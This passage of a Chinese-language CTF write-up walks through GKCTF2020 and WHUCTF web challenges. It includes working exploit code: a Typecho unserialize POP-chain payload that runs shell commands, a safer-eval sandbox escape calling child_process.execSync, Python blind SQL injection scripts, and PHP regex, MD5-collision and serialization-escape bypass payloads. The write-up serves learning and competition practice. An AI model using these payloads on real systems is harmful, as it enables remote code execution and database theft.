<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;_items <span class="keyword">as</span> $item) &#123;</span><br><span class="line">    $content .= <span class="string">'&lt;item&gt;'</span> . <span class="keyword">self</span>::EOL;</span><br><span class="line">    $content .= <span class="string">'&lt;title&gt;'</span> . htmlspecialchars($item[<span class="string">'title'</span>]) . <span class="string">'&lt;/title&gt;'</span> . <span class="keyword">self</span>::EOL;</span><br><span class="line">    $content .= <span class="string">'&lt;link&gt;'</span> . $item[<span class="string">'link'</span>] . <span class="string">'&lt;/link&gt;'</span> . <span class="keyword">self</span>::EOL;</span><br><span class="line">    $content .= <span class="string">'&lt;guid&gt;'</span> . $item[<span class="string">'link'</span>] . <span class="string">'&lt;/guid&gt;'</span> . <span class="keyword">self</span>::EOL;</span><br><span class="line">    $content .= <span class="string">'&lt;pubDate&gt;'</span> . <span class="keyword">$this</span>-&gt;dateFormat($item[<span class="string">'date'</span>]) . <span class="string">'&lt;/pubDate&gt;'</span> . <span class="keyword">self</span>::EOL;</span><br><span class="line">    <span class="comment">//给师傅们减轻负担QAQ，要加上$item['category'] = array(new Typecho_Request());和$this-&gt;_type防止500</span></span><br><span class="line">    $content .= <span class="string">'&lt;dc:creator&gt;'</span> . htmlspecialchars($item[<span class="string">'author'</span>]-&gt;screenName) . <span class="string">'&lt;/dc:creator&gt;'</span> . <span class="keyword">self</span>::EOL;</span><br><span class="line">    $item[<span class="string">'category'</span>] = <span class="keyword">array</span>(<span class="keyword">new</span> Typecho_Request());</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($item[<span class="string">'category'</span>]) &amp;&amp; is_array($item[<span class="string">'category'</span>])) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> ($item[<span class="string">'category'</span>] <span class="keyword">as</span> $category) &#123;</span><br><span class="line">            $content .= <span class="string">'&lt;category&gt;&lt;![CDATA['</span> . $category[<span class="string">'name'</span>] . <span class="string">']]&gt;&lt;/category&gt;'</span> . <span class="keyword">self</span>::EOL;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>其中调用了<code>$item[&#39;author&#39;]-&gt;screenName</code>，<code>$item</code>是<code>$this-&gt;_items</code>的foreach循环出来的，并且<code>$this-&gt;_items</code>是<code>Typecho_Feed</code>类的一个<code>private</code>属性。</p>
<p>我们可以利用这个<code>$item</code>来调用某个类的<code>__get()</code>方法，上面说过<code>__get()</code>方法是用于从不可访问的属性读取数据，实际执行中这里会获取该类的<code>screenName</code>属性，如果我们给<code>$item[&#39;author&#39;]</code>设置的类中没有<code>screenName</code>就会执行该类的<code>__get()</code>方法</p>
<p>再次进行全局搜索__get，在<code>/var/Typecho/Request.php</code>发现一个可利用的<code>__get</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get($key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进该类中的get方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($key, $default = NULL)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_params[$key]):</span><br><span class="line">            $value = <span class="keyword">$this</span>-&gt;_params[$key];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="keyword">isset</span>(<span class="keyword">self</span>::$_httpParams[$key]):</span><br><span class="line">            $value = <span class="keyword">self</span>::$_httpParams[$key];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            $value = $default;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $value = !is_array($value) &amp;&amp; strlen($value) &gt; <span class="number">0</span> ? $value : $default;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_applyFilter($value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进<code>_applyFilter</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">_applyFilter</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;_filter) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;_filter <span class="keyword">as</span> $filter) &#123;</span><br><span class="line">            $value = is_array($value) ? array_map($filter, $value) :</span><br><span class="line">            call_user_func($filter, $value);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_filter = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现call_user_func($filter, $value)，这个函数的作用是把第一个参数作为回调函数调用，如：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">barber</span><span class="params">($type)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"You wanted a $type haircut, no problem\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line">call_user_func(<span class="string">'barber'</span>, <span class="string">"mushroom"</span>);  <span class="comment">//输出You wanted a mushroom haircut, no problem</span></span><br><span class="line">call_user_func(<span class="string">'barber'</span>, <span class="string">"shave"</span>);  <span class="comment">//输出You wanted a shave haircut, no problem</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>所以可以利用<code>call_user_func</code>或者<code>array_map</code>来执行代码，如设置<code>$filter</code>为数组，第一个数组键值是<code>assert</code>，<code>$value</code>设置php代码，即可执行</p>
<p>整个pop链为：</p>
<p><code>install.php中unserialize()内容可控==&gt;install.php实例化了一个Typecho_Db，其中获取适配器名称$adapterName时调用了魔术方法__toString==&gt;Feed.php执行__toString()的时候在获取screenName的时候调用了__get()方法==&gt;Request.php中__get()中调用的get()，其中执行了_applyFilte==&gt;
Request.php中的_applyFilter()中使用了call_user_func()，该回调函数导致漏洞触发</code></p>
<p>payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span>&#123;</span><br><span class="line">		<span class="keyword">private</span> $_type;</span><br><span class="line">		<span class="keyword">private</span> $_items = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;_type = <span class="string">"RSS 2.0"</span>;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;_items = <span class="keyword">array</span>(</span><br><span class="line">				<span class="keyword">array</span>(</span><br><span class="line">					<span class="string">"title"</span> =&gt; <span class="string">"test"</span>,</span><br><span class="line">					<span class="string">"link"</span> =&gt; <span class="string">"test"</span>,</span><br><span class="line">					<span class="string">"data"</span> =&gt; <span class="string">"20190430"</span>,</span><br><span class="line">					<span class="string">"author"</span> =&gt; <span class="keyword">new</span> Typecho_Request(),</span><br><span class="line">				),</span><br><span class="line">			);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span>&#123;</span><br><span class="line">		<span class="keyword">private</span> $_params = <span class="keyword">array</span>();</span><br><span class="line">		<span class="keyword">private</span> $_filter = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;_params = <span class="keyword">array</span>(</span><br><span class="line">				<span class="string">"screenName"</span> =&gt; <span class="string">"eval('system(\'cat /flag\');exit;')"</span>,</span><br><span class="line">			);</span><br><span class="line">			<span class="keyword">$this</span>-&gt;_filter = <span class="keyword">array</span>(<span class="string">"assert"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	$a = <span class="keyword">new</span> Typecho_Feed();</span><br><span class="line">	$c = <span class="keyword">array</span>(</span><br><span class="line">		<span class="string">"adapter"</span> =&gt; $a,</span><br><span class="line">		<span class="string">"prefix"</span> =&gt; <span class="string">"test"</span>,</span><br><span class="line">	);</span><br><span class="line">	<span class="keyword">echo</span> base64_encode(serialize($c));</span><br></pre></td></tr></table></figure>

<p>得到：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YTo0OntzOjU6InRpdGxlIjtzOjQ6InRlc3QiO3M6NDoibGluayI7czo0OiJ0ZXN0IjtzOjQ6ImRhdGEiO3M6ODoiMjAxOTA0MzAiO3M6NjoiYXV0aG9yIjtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjM1OiJldmFsKCdzeXN0ZW0oXCdjYXQgL2ZsYWdcJyk7ZXhpdDsnKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6NDoidGVzdCI7fQ</span><br></pre></td></tr></table></figure>

<p>最后通过<code>__typecho_config</code>传入<br><img src="/2020/05/29/GKCTF--WHUCTF/1590552932138.png" alt="1590552932138"></p>
<p>这里finish参数这里不能用，可以改为start<br><img src="/2020/05/29/GKCTF--WHUCTF/1590553061202.png" alt="1590553061202"></p>
<h2 id="GKCTF2020-EZ三剑客-EzNode"><a href="#GKCTF2020-EZ三剑客-EzNode" class="headerlink" title="[GKCTF2020]EZ三剑客-EzNode"></a>[GKCTF2020]EZ三剑客-EzNode</h2><p>考点：<code>saferEval</code>沙箱逃逸</p>
<p>源码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">'body-parser'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> saferEval = <span class="built_in">require</span>(<span class="string">'safer-eval'</span>); <span class="comment">// 2019.7/WORKER1 找到一个很棒的库</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"></span><br><span class="line">app.use(bodyParser.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">app.use(bodyParser.json());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2020.1/WORKER2 老板说为了后期方便优化</span></span><br><span class="line">app.use(<span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (req.path === <span class="string">'/eval'</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> delay = <span class="number">60</span> * <span class="number">1000</span>;</span><br><span class="line">    <span class="built_in">console</span>.log(delay);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">Number</span>.isInteger(<span class="built_in">parseInt</span>(req.query.delay))) &#123;</span><br><span class="line">      delay = <span class="built_in">Math</span>.max(delay, <span class="built_in">parseInt</span>(req.query.delay));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> t = setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> next(), delay);</span><br><span class="line">    <span class="comment">// 2020.1/WORKER3 老板说让我优化一下速度，我就直接这样写了，其他人写了啥关我p事</span></span><br><span class="line">    setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      clearTimeout(t);</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">'timeout'</span>);</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        res.send(<span class="string">'Timeout!'</span>);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, <span class="number">1000</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    next();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">'/eval'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> response = <span class="string">''</span>;</span><br><span class="line">  <span class="keyword">if</span> (req.body.e) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      response = saferEval(req.body.e);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">      response = <span class="string">'Wrong Wrong Wrong!!!!'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  res.send(<span class="built_in">String</span>(response));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPI</span></span><br><span class="line">app.get(<span class="string">'/source'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.set(<span class="string">'Content-Type'</span>, <span class="string">'text/javascript;charset=utf-8'</span>);</span><br><span class="line">  res.send(fs.readFileSync(<span class="string">'./index.js'</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2019.12/WORKER3 为了方便我自己查看版本，加上这个接口</span></span><br><span class="line">app.get(<span class="string">'/version'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.set(<span class="string">'Content-Type'</span>, <span class="string">'text/json;charset=utf-8'</span>);</span><br><span class="line">  res.send(fs.readFileSync(<span class="string">'./package.json'</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.set(<span class="string">'Content-Type'</span>, <span class="string">'text/html;charset=utf-8'</span>);</span><br><span class="line">  res.send(fs.readFileSync(<span class="string">'./index.html'</span>))</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">80</span>, <span class="string">'0.0.0.0'</span>, () =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'Start listening'</span>)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>首先题目导入了<code>safer-eval</code>库，并且给出了其版本为<code>&quot;safer-eval&quot;: &quot;1.3.6&quot;</code><br><img src="/2020/05/29/GKCTF--WHUCTF/1590564113452.png" alt="1590564113452"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (Number.isInteger(parseInt(req.query.delay))) &#123;</span><br><span class="line">  delay = Math.max(delay, parseInt(req.query.delay));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> t = setTimeout(() =&gt; next(), delay);</span><br></pre></td></tr></table></figure>

<p>这里使用Number.isInteger()函数判断是否为整数，内嵌套了[parseInt() 函数可解析一个字符串，并返回一个整数。]</p>
<p>然后取delay值为最大的整数。</p>
<p>进行 <strong>const t = setTimeout(() =&gt; next(), delay);</strong></p>
<p><strong>setTimeout( )</strong>是设定一个指定等候时间 (单位是千分之一秒, millisecond), 时间到了, 浏览器就会执行一个指定的 method 或 function<br>其中setTimeout()函数有一个漏洞</p>
<blockquote>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">当delay大于<span class="number">2147483647</span>或小于<span class="number">1</span>时，延迟将设置为<span class="number">1</span>。非整数延迟被截断为整数。</span><br></pre></td></tr></table></figure>
</blockquote>
<p>所以当delay设置为1，而1ms====0，直接进入next()下一步</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">app.post(<span class="string">'/eval'</span>, <span class="function"><span class="keyword">function</span> <span class="params">(req, res)</span> </span>&#123;</span><br><span class="line">  let response = <span class="string">''</span>;</span><br><span class="line">  <span class="keyword">if</span> (req.body.e) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      response = saferEval(req.body.e);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">      response = <span class="string">'Wrong Wrong Wrong!!!!'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  res.send(String(response));</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>接着就是构造函数执行任意代码：</p>
<blockquote>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span><span class="params">()</span>&#123;<span class="title">const</span> <span class="title">process</span> = <span class="title">clearImmediate</span>.<span class="title">constructor</span><span class="params">("return process;")</span><span class="params">()</span>; <span class="title">return</span> <span class="title">process</span>.<span class="title">mainModule</span>.<span class="title">require</span><span class="params">("child_process")</span>.<span class="title">execSync</span><span class="params">("cat /flag")</span>.<span class="title">toString</span><span class="params">()</span>&#125;)<span class="params">()</span></span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>由于还没学过nodejs，所以直接照搬了</p>
<p><img src="/2020/05/29/GKCTF--WHUCTF/1590568292960.png" alt="1590568292960"></p>
<h1 id="WHUCTF"><a href="#WHUCTF" class="headerlink" title="WHUCTF"></a>WHUCTF</h1><p><a href="http://iwhu.info/" target="_blank" rel="noopener">http://iwhu.info/</a></p>
<p>比赛时间5月23-27</p>
<h2 id="Easy-sqli"><a href="#Easy-sqli" class="headerlink" title="Easy_sqli"></a>Easy_sqli</h2><p>用户名处的盲注<br>这里使用bool盲注<br>脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">database_name=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        payload = <span class="string">"admin' and ascii(substr(database(),"</span>+str(i)+<span class="string">",1))="</span>+str(j)+<span class="string">"#"</span></span><br><span class="line">        payload2 = <span class="string">"admin' and ascii(substr((selselectect group_concat(table_name) frfromom infoorrmation_schema.tables whewherere table_schema='easy_sql1'),"</span> + str(i) + <span class="string">",1))="</span> + str(j) + <span class="string">"#"</span></span><br><span class="line">        payload3 = <span class="string">"admin' and ascii(substr((selselectect group_concat(column_name) frfromom infoorrmation_schema.columns whewherere table_name='f1ag_y0u_wi1l_n3ver_kn0w'),"</span> + str(i) + <span class="string">",1))="</span> + str(j) + <span class="string">"#"</span></span><br><span class="line">        payload4 = <span class="string">"admin' and ascii(substr((selselectect group_concat(f111114g) frfromom f1ag_y0u_wi1l_n3ver_kn0w),"</span> + str(i) + <span class="string">",1))="</span> + str(j) + <span class="string">"#"</span></span><br><span class="line">        data3 = &#123;</span><br><span class="line">                        <span class="string">"user"</span>:payload4,</span><br><span class="line">                        <span class="string">"pass"</span>:<span class="string">"55555"</span></span><br><span class="line">                        &#125;</span><br><span class="line">        url = <span class="string">'http://218.197.154.9:10011/login.php'</span></span><br><span class="line">        res = requests.post(url=url,data=data3).text</span><br><span class="line">        <span class="comment">#print(res)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"Login success!"</span> <span class="keyword">in</span> res:</span><br><span class="line">            database_name+=chr(j)</span><br><span class="line">            print(database_name)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/29/GKCTF--WHUCTF/1590203461939.png" alt="1590203461939"></p>
<p>二分法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">database_name=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">128</span></span><br><span class="line">    mid= (low+high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> low&lt;high:</span><br><span class="line">        payload = <span class="string">"admin' and ascii(substr(database(),"</span>+str(i)+<span class="string">",1))&gt;"</span>+str(mid)+<span class="string">"#"</span></span><br><span class="line">        payload2 = <span class="string">"admin' and ascii(substr((selselectect group_concat(table_name) frfromom infoorrmation_schema.tables whewherere table_schema='easy_sql1'),"</span> + str(i) + <span class="string">",1))&gt;"</span> + str(mid) + <span class="string">"#"</span></span><br><span class="line">        payload3 = <span class="string">"admin' and ascii(substr((selselectect group_concat(column_name) frfromom infoorrmation_schema.columns whewherere table_name='f1ag_y0u_wi1l_n3ver_kn0w'),"</span> + str(i) + <span class="string">",1))&gt;"</span> + str(mid) + <span class="string">"#"</span></span><br><span class="line">        payload4 = <span class="string">"admin' and ascii(substr((selselectect group_concat(f111114g) frfromom f1ag_y0u_wi1l_n3ver_kn0w),"</span> + str(i) + <span class="string">",1))&gt;"</span> + str(mid) + <span class="string">"#"</span></span><br><span class="line">        data3 = &#123;</span><br><span class="line">                        <span class="string">"user"</span>:payload,</span><br><span class="line">                        <span class="string">"pass"</span>:<span class="string">"55555"</span></span><br><span class="line">                        &#125;</span><br><span class="line">        <span class="comment">#print(data3)</span></span><br><span class="line">        url = <span class="string">'http://218.197.154.9:10011/login.php'</span></span><br><span class="line">        res = requests.post(url=url,data=data3).text</span><br><span class="line">        <span class="comment">#print(res)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"Login success!"</span> <span class="keyword">in</span> res:</span><br><span class="line">            low = mid+<span class="number">1</span></span><br><span class="line">            mid = (low+high) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low+high) // <span class="number">2</span></span><br><span class="line">    database_name+=chr(mid)</span><br><span class="line">    print(database_name)</span><br></pre></td></tr></table></figure>



<h2 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h2><p>源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line">$string_1 = $_GET[<span class="string">'str1'</span>];</span><br><span class="line">$string_2 = $_GET[<span class="string">'str2'</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//1st</span></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'num'</span>] !== <span class="string">'23333'</span> &amp;&amp; preg_match(<span class="string">'/^23333$/'</span>, $_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'1st ok'</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'会代码审计嘛23333'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//2nd</span></span><br><span class="line"><span class="keyword">if</span>(is_numeric($string_1))&#123;</span><br><span class="line">    $md5_1 = md5($string_1);</span><br><span class="line">    $md5_2 = md5($string_2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($md5_1 != $md5_2)&#123;</span><br><span class="line">        $a = strtr($md5_1, <span class="string">'pggnb'</span>, <span class="string">'12345'</span>);</span><br><span class="line">        $b = strtr($md5_2, <span class="string">'pggnb'</span>, <span class="string">'12345'</span>);</span><br><span class="line">        <span class="keyword">if</span>($a == $b)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'2nd ok'</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"can u give me the right str???"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no!!!!!!!!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'is str1 numeric??????'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//3nd</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="string">'/x/'</span>, <span class="string">'yy'</span>, $string);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username = $_POST[<span class="string">'username'</span>];</span><br><span class="line"></span><br><span class="line">$password = <span class="string">"aaaaa"</span>;</span><br><span class="line">$user = <span class="keyword">array</span>($username, $password);</span><br><span class="line"></span><br><span class="line">$r = filter(serialize($user));</span><br><span class="line"><span class="keyword">if</span>(unserialize($r)[<span class="number">1</span>] == <span class="string">"123456"</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">'flag.php'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>1st：<br><code>/^23333$/</code>这个正则有个漏洞，可以利用换行污染绕过<code>num=23333%0a</code><br>2st:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(is_numeric($string_1))&#123;</span><br><span class="line">    $md5_1 = md5($string_1);</span><br><span class="line">    $md5_2 = md5($string_2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($md5_1 != $md5_2)&#123;</span><br><span class="line">        $a = strtr($md5_1, <span class="string">'pggnb'</span>, <span class="string">'12345'</span>);</span><br><span class="line">        $b = strtr($md5_2, <span class="string">'pggnb'</span>, <span class="string">'12345'</span>);</span><br><span class="line">        <span class="keyword">if</span>($a == $b)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'2nd ok'</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>str1为数字，str1和str2MD5之后不能相等，即不能以0e开头，但是经过strstr替换后又必须相等，即必须0e开头，所以写个脚本爆破，先找一个村数字str1，MD5后为0e+数字，str2加密后为0e开头，并且后面只包含数字和pggnb这几个字母，开始以为必须包含完整的<code>pggnb</code>结果发现strstr函数也会替换单个字母</p>
<p>脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">MD5</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(data.encode(<span class="string">"utf-8"</span>)).hexdigest()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5_1</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>**<span class="number">30</span>):</span><br><span class="line">        s = <span class="string">'0123456789pggnb'</span></span><br><span class="line">        data_md5 = MD5(str(i))</span><br><span class="line">        print(<span class="string">"当前字符串-----&gt;"</span>+str(i))</span><br><span class="line">        print(<span class="string">"加密结果-----&gt;"</span>+data_md5)</span><br><span class="line">        <span class="keyword">if</span> data_md5[<span class="number">0</span>:<span class="number">2</span>] == <span class="string">'0e'</span>:</span><br><span class="line">            <span class="keyword">if</span> all(map(<span class="keyword">lambda</span> x: x <span class="keyword">in</span> s, data_md5[<span class="number">2</span>:])):</span><br><span class="line">                print(str(i))</span><br><span class="line">                print(data_md5)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">                </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    md5_1()</span><br></pre></td></tr></table></figure>

<blockquote>
<p>11230178   0e732639146814822596b49bb6939b97</p>
</blockquote>
<p>3st<br>简单的字符逃逸：</p>
<blockquote>
<p>username=xxxxxxxxxxxxxxxxxxxx”;i:1;s:6:”123456”;}</p>
</blockquote>
<p><img src="/2020/05/29/GKCTF--WHUCTF/1590282160589.png" alt="1590282160589"></p>
<p>最终payliad:</p>
<blockquote>
<p>GET: ?num=23333%0A&amp;str1=0e215962017&amp;str2=11230178</p>
<p>POST: username=xxxxxxxxxxxxxxxxxxxx”;i:1;s:6:”123456”;}</p>
